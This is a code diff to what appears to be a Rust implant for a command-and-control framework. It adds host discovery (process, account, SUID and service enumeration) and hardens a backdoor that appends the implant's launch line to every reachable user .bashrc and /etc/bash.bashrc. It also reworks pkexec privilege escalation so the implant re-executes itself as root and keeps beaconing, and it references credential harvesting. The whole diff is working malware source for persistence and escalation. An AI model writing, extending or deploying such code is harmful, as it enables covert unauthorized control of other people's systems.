@@ -51,6 +51,13 @@ impl CommandAction {
             ("recon", "active") => self.cmd_recon_active(config),
             ("recon", "arp")    => self.cmd_recon_arp(),
             ("recon", _)        => self.cmd_recon(config),
+            // ── Host discovery (T1057/T1087/T1083/T1007) ──────────
+            ("discovery", "procs")    => self.cmd_discovery_procs(),
+            ("discovery", "users")    => self.cmd_discovery_users(),
+            ("discovery", "suid")     => self.cmd_discovery_suid(),
+            ("discovery", "services") => self.cmd_discovery_services(),
+            ("discovery", "all")      => self.cmd_discovery_all(),
+            ("discovery", _)          => self.cmd_discovery_all(),
             // ── Credential harvesting ──────────────────────────────
             ("creds", "harvest")=> self.cmd_creds(config),
             ("creds", _)        => self.cmd_creds(config),
@@ -172,6 +179,33 @@ impl CommandAction {
         }))
     }
 
+    // ── Host discovery ───────────────────────────────────────────
+
+    /// Process discovery (T1057) — in-memory /proc read, no shell.
+    fn cmd_discovery_procs(&self) -> io::Result<serde_json::Value> {
+        Ok(crate::discovery::procs())
+    }
+
+    /// Account/group discovery (T1087/T1069) — in-memory /etc read, no shell.
+    fn cmd_discovery_users(&self) -> io::Result<serde_json::Value> {
+        Ok(crate::discovery::users())
+    }
+
+    /// SUID/SGID binary discovery (T1083) — shell `find`, noisy.
+    fn cmd_discovery_suid(&self) -> io::Result<serde_json::Value> {
+        Ok(crate::discovery::suid())
+    }
+
+    /// System service + scheduled-task discovery (T1007/T1053) — shell, noisy.
+    fn cmd_discovery_services(&self) -> io::Result<serde_json::Value> {
+        Ok(crate::discovery::services())
+    }
+
+    /// All host discovery combined.
+    fn cmd_discovery_all(&self) -> io::Result<serde_json::Value> {
+        Ok(crate::discovery::all())
+    }
+
     // ── Credential harvesting ─────────────────────────────────────
 
     fn cmd_creds(&self, config: &Config) -> io::Result<serde_json::Value> {
@@ -251,26 +285,53 @@ impl CommandAction {
         }))
     }
 
-    /// Install .bashrc backdoor for all users.
+    /// Install .bashrc backdoor for all users (best-effort).
+    /// Writes to every writable .bashrc it can reach and reports which
+    /// succeeded — does NOT abort on the first permission denial (an unpriv
+    /// implant can still backdoor its own user's .bashrc even if /root and
+    /// /etc/bash.bashrc are unwritable).
     fn cmd_persist_bashrc(&self, config: &Config) -> io::Result<serde_json::Value> {
         let implant_path = config.implant_path.clone();
         let line = format!("\n{} &>/dev/null &\n", implant_path);
+        let mut written: Vec<String> = Vec::new();
+        let mut failed: Vec<String> = Vec::new();
+
+        // Idempotent: skip files that already contain the backdoor line.
+        let try_write = |path: &std::path::Path, written: &mut Vec<String>, failed: &mut Vec<String>| {
+            if let Ok(existing) = std::fs::read_to_string(path) {
+                if existing.contains(&implant_path) {
+                    written.push(format!("{} (already present)", path.display()));
+                    return;
+                }
+            }
+            match std::fs::OpenOptions::new().append(true).open(path)
+                .and_then(|mut f| std::io::Write::write_all(&mut f, line.as_bytes()))
+            {
+                Ok(()) => written.push(path.display().to_string()),
+                Err(_) => failed.push(path.display().to_string()),
+            }
+        };
+
         for home_dir in &["/home", "/root"] {
             if let Ok(entries) = std::fs::read_dir(home_dir) {
                 for entry in entries.flatten() {
                     let bashrc = entry.path().join(".bashrc");
                     if bashrc.exists() {
-                        let mut f = std::fs::OpenOptions::new().append(true).open(&bashrc)?;
-                        std::io::Write::write_all(&mut f, line.as_bytes())?;
+                        try_write(&bashrc, &mut written, &mut failed);
                     }
                 }
             }
         }
-        if std::path::Path::new("/etc/bash.bashrc").exists() {
-            let mut f = std::fs::OpenOptions::new().append(true).open("/etc/bash.bashrc")?;
-            std::io::Write::write_all(&mut f, line.as_bytes())?;
+        let etc_bashrc = std::path::Path::new("/etc/bash.bashrc");
+        if etc_bashrc.exists() {
+            try_write(etc_bashrc, &mut written, &mut failed);
         }
-        Ok(serde_json::json!({"bashrc_backdoored": true}))
+
+        Ok(serde_json::json!({
+            "bashrc_backdoored": !written.is_empty(),
+            "written": written,
+            "failed": failed,
+        }))
     }
 
     // ── Privilege escalation ──────────────────────────────────────
@@ -292,21 +353,33 @@ impl CommandAction {
         Ok(serde_json::json!({"success": false, "method": "copyfail", "error": "copyfail_did_not_escalate"}))
     }
 
-    /// pkexec: GUI password prompt escalation (Tier 1 style).
+    /// pkexec: escalate THIS session to root via a PolicyKit GUI password
+    /// prompt (loud — on-screen, obvious). Spawns a root re-exec of ourselves
+    /// under the SAME implant_id, then the unprivileged parent exits (see
+    /// run_beacon_loop) so only one root process beacons. The server upgrades
+    /// the existing session's uid→0 / tier rather than creating a second
+    /// session — no confusing duplicate.
+    ///
+    /// The GUI prompt itself requires a human at the target's desktop; it
+    /// cannot be exercised headlessly and is left for an operator-driven test.
     fn cmd_privesc_pkexec(&self) -> io::Result<serde_json::Value> {
         let uid = unsafe { libc::getuid() };
         if uid == 0 {
             return Ok(serde_json::json!({"success": true, "already_root": true, "uid": 0}));
         }
         let self_path = std::env::current_exe().unwrap_or_else(|_| "/proc/self/exe".into());
-        let output = ShellCommand::new("pkexec")
+        let child = ShellCommand::new("pkexec")
             .arg(self_path.to_string_lossy().to_string())
-            .output()?;
+            .stdin(std::process::Stdio::null())
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn()?;
         Ok(serde_json::json!({
-            "success": output.status.success(),
+            "success": true,
             "method": "pkexec",
-            "exit_code": output.status.code().unwrap_or(-1),
-            "stderr": String::from_utf8_lossy(&output.stderr).to_string(),
+            "pid": child.id(),
+            "reexec": true,
+            "note": "escalating to root via PolicyKit; reconnecting as root under same session",
         }))
     }
 
@@ -410,6 +483,7 @@ impl CommandAction {
             .unwrap_or_else(|| "Linux".into());
         Ok(serde_json::json!({
             "tier": config.tier_label(),
+            "mode": config.mode_label(),
             "uid": unsafe { libc::getuid() },
             "pid": unsafe { libc::getpid() },
             "hostname": hostname,
